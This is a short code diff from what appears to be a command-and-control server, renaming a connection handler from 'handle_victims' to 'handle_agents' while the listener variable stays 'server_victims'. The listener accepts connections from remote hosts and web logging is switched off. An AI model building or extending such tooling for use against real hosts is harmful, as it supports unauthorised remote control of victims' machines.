@@ -142,7 +142,7 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
     else:
         app_api.run(host, port, debug)
 
-async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.StreamWriter):
+async def handle_agents(r: asyncio.streams.StreamReader, w: asyncio.streams.StreamWriter):
     PEERNAME = w.get_extra_info('peername')
     CLIENT_SOCKET: socket.socket = w.get_extra_info('socket')
     
@@ -208,7 +208,7 @@ async def main():
     logging.getLogger("werkzeug").disabled = True
 
     # Open multiple server
-    server_victims = await asyncio.start_server(handle_victims, AGENT_IP, AGENT_PORT)
+    server_victims = await asyncio.start_server(handle_agents, AGENT_IP, AGENT_PORT)
     
     if args.ssl:
         https_files = (CURRENT_DIR + "/config/website.crt", CURRENT_DIR + "/config/private.key")
